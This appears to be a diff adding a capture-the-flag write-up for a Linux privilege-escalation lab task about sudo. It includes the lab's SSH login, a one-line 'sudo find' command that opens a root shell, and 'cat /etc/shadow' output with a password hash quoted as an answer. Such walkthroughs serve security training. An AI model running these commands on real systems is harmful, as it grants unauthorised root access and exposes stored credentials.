@@ -1,0 +1,41 @@
+TASK_6
+Linux Privilege Escalation > Task 6 "sudo"
+
+______ssh creds______
+|Username: karen    |
+|Password: Password1|
+---------------------
+
+
+The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges.
+Any user can check what tools can run with sudo rights by typing sudo -l
+(connect via ssh to the target pls :-D)
+input   :   sudo -l
+outpt   :   ...
+            (ALL) NOPASSWD: /usr/bin/find
+            (ALL) NOPASSWD: /usr/bin/less
+            (ALL) NOPASSWD: /usr/bin/nano
+As we see we have 3 tools that the user "karen" can use with sudo rights. So the answer for the first question is 3. Lets see what about is the tool that the room gives us.
+
+GTFOBin is a powerfull curated list of UNIX Binaries that can be used to bypass local security restrictions in misconfigured systems. With a simple search, it seems that all the above tools have a one-line command that opens a root shell with superuser (sudo) rights. For now we will use the first one.
+
+After we have connected with ssh to the target we type
+input   :   sudo find . -exec /bin/sh \; -quit
+outpt   :   //A root shell opens. Hit "whoami" to verify it
+
+And now we are ready to find the flag
+input   :   cat <PATH_TO_FLAG>
+outpt   :   <FLAG>
+
+We just completed the exploitation of the target! Now we have to answer to the rest questions
+For the third one, we will follow the same technique. We search for nmap and we choose the "sudo" section.
+
+Last but not least, we have to find the hash of a user's password. In Linux is stored inside /etc/shadow.
+input   :   cat /etc/shadow
+outpt   :   ...
+            frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
+So the answer will be "6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1"
+
+
+
+made by @gr1m.r3ap3r
